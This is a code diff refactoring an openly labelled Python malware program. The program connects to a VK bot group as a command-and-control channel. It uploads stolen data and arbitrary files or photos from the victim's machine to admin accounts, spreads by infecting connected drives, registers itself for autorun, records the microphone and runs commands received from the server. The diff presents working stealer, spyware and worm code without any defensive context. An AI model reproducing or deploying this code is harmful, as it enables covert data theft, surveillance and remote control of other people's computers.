@@ -1,9 +1,6 @@
 # -*- coding: utf-8 -*-
 
 # Should we show debug messages or not.
-from os import stat
-
-
 DEBUG = True
 
 try:
@@ -715,203 +712,6 @@ class Commands:
         # Returning.
         return ", ".join(filesystem_get_drives_list())
 
-class Server:
-    # Class method that implements server.
-    @staticmethod
-    def connect() -> None:
-        # @function connect()
-        # @returns None
-        # @description Function that connects to the server.
-
-        # Globalising variables.
-        global __SERVER_API
-        global __SERVER_BOT
-
-        try:
-            # Trying to connect to server.
-
-            __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
-            __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
-        except Exception as _exception: # noqa
-            # If there is exception occurred.
-
-            # Showing debug message to the developer.
-            debug_message(f"Oops... Exception occurred in function Server.connect()! "
-                        f"Full exception information - {_exception}")
-
-            # Exiting.
-            raise SystemExit
-
-    @staticmethod
-    def method(method: str, parameters: dict, _isretry=False) -> any:
-        # @function method()
-        # @returns any
-        # @description Function that calls server method.
-
-        if __SERVER_API is None:
-            # If no server API.
-
-            # return.
-            return
-        try:
-            # Trying to call method.
-
-            if "random_id" not in parameters:
-                # If there is no random id.
-
-                # Adding random id.
-                parameters["random_id"] = vk_api.utils.get_random_id()
-
-            # Executing method.
-            return __SERVER_API.method(method, parameters) # noqa
-        except Exception as Error:
-            # Error.
-
-            # Message.
-            debug_message(f"Error when trying to call server method! Error: {Error}")
-
-            if not _isretry:
-                # If this is not retry.
-
-                # Retrying.
-                return Server.method(method, parameters, True)
-
-    @staticmethod
-    def message(_text: str, _attachmment: str = None, _peer_index: int = None) -> None:
-        # @function message()
-        # @returns any
-        # @description Function that sends message to the server.
-
-        # Globalising name.
-        global __NAME
-
-        if _peer_index is None:
-            # If peer index is not specified.
-
-            for _admin_peer_index in SERVER_ADMINS:
-                # For every peer index in admins peer indices.
-
-                # Sending messages to they.
-                Server.message(_text, _attachmment, _admin_peer_index)
-
-            # Returning.
-            return
-
-        # Adding name to the text.
-        _text = f"<{__NAME}>\n{_text}"
-
-        # Debug message.
-        debug_message("Sent new message!")
-
-        # Calling method.
-        Server.method("messages.send", {
-                        "message": _text,
-                        "attachment": _attachmment,
-                        "peer_id": _peer_index})
-
-    @staticmethod
-    def listen() -> None:
-        # @function listen()
-        # @returns None
-        # @description Function that listen server for the new message.
-
-        if __SERVER_BOT is None:
-            # If server bot is none.
-
-            # Returning.
-            return
-
-        while True:
-            # Infinity loop.
-
-            try:
-                # Trying to listen.
-
-                for _event in __SERVER_BOT.listen(): # noqa
-                    # For every message event in the server bot listening.
-
-                    if _event.type == vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW:
-                        # If this is message event.
-
-                        # Processing client-server answer.
-                        client_answer_server(_event)
-            except Exception as _exception: # noqa
-                # If there is exception occurred.
-
-                # Showing debug message to the developer.
-                debug_message(f"Oops... Exception occurred in function Server.listen()! "
-                            f"Full exception information - {_exception}")
-
-    @staticmethod
-    def upload_photo(_path: str) -> str:
-        # @function upload_photo()
-        # @returns str
-        # @description Function that  uploads photo on the server.
-
-        # Getting uploader.
-        _uploader = vk_api.upload.VkUpload(__SERVER_API)
-
-        # Uploading photo.
-        _photo = _uploader.photo_messages(_path)
-        _photo = _photo[0]
-
-        if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
-            # If photo have all those fields.
-
-            # Getting photo fields.
-            _owner_id = _photo['owner_id']
-            _photo_id = _photo['id']
-            _access_key = _photo['access_key']
-
-            # Returning photo URN.
-            return f'photo{_owner_id}_{_photo_id}_{_access_key}'
-
-        # Returning blank.
-        return ""
-
-    @staticmethod
-    def upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
-        # @function upload_document()
-        # @returns str or list
-        # @description Function that uploads document on the server and returns it.
-
-        try:
-            # Trying to upload document.
-
-            # Getting api for the uploader.
-            _server_api = __SERVER_API.get_api() # noqa
-
-            # Getting upload server.
-            _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']
-
-            # Posting file on the server.
-            _request = json.loads(requests.post(_upload_server, files={'file': open(_path, 'rb')}).text)
-
-            if "file" in _request:
-                # If there is all fields in response.
-
-                # Saving file to the docs.
-                _request = _server_api.docs.save(file=_request['file'], title=_title, tags=[])
-
-                # Returning document.
-                return f"doc{_request[_type]['owner_id']}_{_request[_type]['id']}"
-            else:
-                # If there is not all fields.
-
-                # Debug message.
-                debug_message(f"Error when uploading document (Request)!")
-
-                # Returning request as error.
-                return [_request] # noqa
-        except Exception as _exception: # noqa
-            # If there is error.
-
-            # Debug message.
-            debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
-
-            # Returning exception.
-            return [_exception] # noqa
-
 
 def filesystem_get_size(_path: str) -> int:
     # @function filesystem_get_size()
@@ -1122,7 +922,7 @@ def spreading_thread() -> None:
                     # For every drive in connected drives.
 
                     # Server message.
-                    Server.message(f"[Spreading] Connected drive {_drive}!")
+                    server_message(f"[Spreading] Connected drive {_drive}!")
                     debug_message(f"[Spreading] Connected drive {_drive}!")
 
                     # Infecting drive.
@@ -1136,7 +936,7 @@ def spreading_thread() -> None:
                     # For every drive in disconnected drives.
 
                     # Server message.
-                    Server.message(f"[Spreading] Disconnected drive {_drive}!")
+                    server_message(f"[Spreading] Disconnected drive {_drive}!")
                     debug_message(f"[Spreading] Disconnected drive {_drive}!")
 
             # Updating current drives.
@@ -1470,7 +1270,32 @@ def exit_handler() -> None:
     debug_message("Exiting malware!")
 
     # Sever message.
-    Server.message(f"[Malware] Disconnected from the network!")
+    server_message(f"[Malware] Disconnected from the network!")
+
+
+def server_connect() -> None:
+    # @function server_connect()
+    # @returns None
+    # @description Function that connects to the server.
+
+    # Globalising variables.
+    global __SERVER_API
+    global __SERVER_BOT
+
+    try:
+        # Trying to connect to server.
+
+        __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
+        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
+    except Exception as _exception: # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"Oops... Exception occurred in function server_connect()! "
+                      f"Full exception information - {_exception}")
+
+        # Exiting.
+        raise SystemExit
 
 
 def debug_message(_message: str) -> None:
@@ -1504,6 +1329,39 @@ def get_operating_system() -> str:
 
     # Unsupported operating system (Should not happen)
     return "!UNSUPPORTED_OS!"
+
+
+def server_listen() -> None:
+    # @function server_listen()
+    # @returns None
+    # @description Function that listen server for the new message.
+
+    if __SERVER_BOT is None:
+        # If server bot is none.
+
+        # Returning.
+        return
+
+    while True:
+        # Infinity loop.
+
+        try:
+            # Trying to listen.
+
+            for _event in __SERVER_BOT.listen(): # noqa
+                # For every message event in the server bot listening.
+
+                if _event.type == vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW:
+                    # If this is message event.
+
+                    # Processing client-server answer.
+                    client_answer_server(_event)
+        except Exception as _exception: # noqa
+            # If there is exception occurred.
+
+            # Showing debug message to the developer.
+            debug_message(f"Oops... Exception occurred in function server_listen()! "
+                          f"Full exception information - {_exception}")
 
 
 def load_tags() -> None:
@@ -1717,6 +1575,79 @@ def save_tags() -> None:
                       f"Full exception information - {_exception}")
 
 
+def server_method(method: str, parameters: dict, _isretry=False) -> any:
+    # @function server_method()
+    # @returns any
+    # @description Function that calls server method.
+
+    if __SERVER_API is None:
+        # If no server API.
+
+        # return.
+        return
+
+    try:
+        # Trying to call method.
+
+        if "random_id" not in parameters:
+            # If there is no random id.
+
+            # Adding random id.
+            parameters["random_id"] = vk_api.utils.get_random_id()
+
+        # Executing method.
+        return __SERVER_API.method(method, parameters) # noqa
+    except Exception as Error:
+        # Error.
+
+        # Message.
+        debug_message(f"Ошибка при попытке вызвать метод сервера! Ошибка: {Error}")
+
+        if _isretry:
+            # If this is already retry.
+
+            # Returning.
+            return
+        else:
+            # If this is not retry.
+
+            # Retrying.
+            return server_method(method, parameters, True)
+
+
+def server_message(_text: str, _attachmment: str = None, _peer_index: int = None) -> None:
+    # @function server_message()
+    # @returns any
+    # @description Function that sends message to the server.
+
+    # Globalising name.
+    global __NAME
+
+    if _peer_index is None:
+        # If peer index is not specified.
+
+        for _admin_peer_index in SERVER_ADMINS:
+            # For every peer index in admins peer indices.
+
+            # Sending messages to they.
+            server_message(_text, _attachmment, _admin_peer_index)
+
+        # Returning.
+        return
+
+    # Adding name to the text.
+    _text = f"<{__NAME}>\n{_text}"
+
+    # Debug message.
+    debug_message("Sent new message!")
+
+    # Calling method.
+    server_method("messages.send", {
+                      "message": _text,
+                      "attachment": _attachmment,
+                      "peer_id": _peer_index})
+
+
 def save_name() -> None:
     # @function save_name()
     # @returns None
@@ -1875,19 +1806,19 @@ def stealer_steal_data(_force: bool = False):
                 # For every peer in admins.
 
                 # Uploading document.
-                _uploading_result = Server.upload_document(_path, "Log File", _peer, "doc")
+                _uploading_result = server_upload_document(_path, "Log File", _peer, "doc")
 
                 # Message.
                 if type(_uploading_result) == str:
                     # If all is ok.
 
                     # Message.
-                    Server.message(f"[Stealer] Stolen data:", _uploading_result, _peer)
+                    server_message(f"[Stealer] Stolen data:", _uploading_result, _peer)
                 else:
                     # If there is error.
 
                     # Message.
-                    Server.message(f"[Stealer] Error when uploading stolen data: {_uploading_result}", None, _peer)
+                    server_message(f"[Stealer] Error when uploading stolen data: {_uploading_result}", None, _peer)
 
             # Returning value.
             return __VALUES
@@ -2001,7 +1932,7 @@ def client_answer_server(_event) -> None:
                                     # If this is just photo.
 
                                     # Uploading photo on the server.
-                                    _uploading_result = Server.upload_photo(_uploading_path)
+                                    _uploading_result = server_upload_photo(_uploading_path)
 
                                     # Moving result to attachment.
                                     _response_text = _uploading_title
@@ -2010,7 +1941,7 @@ def client_answer_server(_event) -> None:
                                     # If this is document or audio message.
 
                                     # Uploading file on the server.
-                                    _uploading_result = Server.upload_document(_uploading_path, _uploading_title,
+                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
                                                                                _peer, _uploading_type)
 
                                     if type(_uploading_result) == str:
@@ -2045,10 +1976,10 @@ def client_answer_server(_event) -> None:
         # If response was not void from execution function.
 
         # Answering.
-        Server.message(f"{_response_text}", _response_attachment, _peer)
+        server_message(f"{_response_text}", _response_attachment, _peer)
     else:
         # None answer.
-        Server.message(f"Void... (No response)", _response_attachment, _peer)
+        server_message(f"Void... (No response)", _response_attachment, _peer)
 
 
 def stealer_is_already_worked() -> bool:
@@ -2074,6 +2005,33 @@ def stealer_is_already_worked() -> bool:
 
     # Returning true if file exists.
     return True
+
+
+def server_upload_photo(_path: str) -> str:
+    # @function server_upload_photo()
+    # @returns str
+    # @description Function that  uploads photo on the server.
+
+    # Getting uploader.
+    _uploader = vk_api.upload.VkUpload(__SERVER_API)
+
+    # Uploading photo.
+    _photo = _uploader.photo_messages(_path)
+    _photo = _photo[0]
+
+    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
+        # If photo have all those fields.
+
+        # Getting photo fields.
+        _owner_id = _photo['owner_id']
+        _photo_id = _photo['id']
+        _access_key = _photo['access_key']
+
+        # Returning photo URN.
+        return f'photo{_owner_id}_{_photo_id}_{_access_key}'
+
+    # Returning blank.
+    return ""
 
 
 def execute_python(_code: str, _globals: dict, _locals: dict) -> any:
@@ -2242,6 +2200,49 @@ def autorun_unregister() -> None:
         debug_message(f"Не удалось добавить себя в автозагрузки! Ошибка: {_exception}")
 
 
+def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
+    # @function server_upload_document()
+    # @returns str or list
+    # @description Function that uploads document on the server and returns it.
+
+    try:
+        # Trying to upload document.
+
+        # Getting api for the uploader.
+        _server_api = __SERVER_API.get_api() # noqa
+
+        # Getting upload server.
+        _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']
+
+        # Posting file on the server.
+        _request = json.loads(requests.post(_upload_server, files={'file': open(_path, 'rb')}).text)
+
+        if "file" in _request:
+            # If there is all fields in response.
+
+            # Saving file to the docs.
+            _request = _server_api.docs.save(file=_request['file'], title=_title, tags=[])
+
+            # Returning document.
+            return f"doc{_request[_type]['owner_id']}_{_request[_type]['id']}"
+        else:
+            # If there is not all fields.
+
+            # Debug message.
+            debug_message(f"Error when uploading document (Request)!")
+
+            # Returning request as error.
+            return [_request] # noqa
+    except Exception as _exception: # noqa
+        # If there is error.
+
+        # Debug message.
+        debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
+
+        # Returning exception.
+        return [_exception] # noqa
+
+
 def record_microphone(_path, seconds: int = 1) -> None:
     # @function record_microphone()
     # @returns None
@@ -2319,7 +2320,7 @@ def launch() -> None:
         load_name()
 
         # Connecting to the server.
-        Server.connect()
+        server_connect()
 
         # Starting spreading on the other drives.
         spreading_start()
@@ -2331,7 +2332,7 @@ def launch() -> None:
         autorun_register()
 
         # Message that we connected to the network.
-        Server.message(f"Connected to the network! (His tags: {', '.join(__TAGS)})")
+        server_message(f"Connected to the network! (His tags: {', '.join(__TAGS)})")
 
         # Registering exit_handler() as handler for exit.
         atexit.register(exit_handler)
@@ -2340,7 +2341,7 @@ def launch() -> None:
         stealer_steal_data()
 
         # Starting listening messages.
-        Server.listen()
+        server_listen()
     except Exception as _exception: # noqa
         # If there is exception occurred.
 
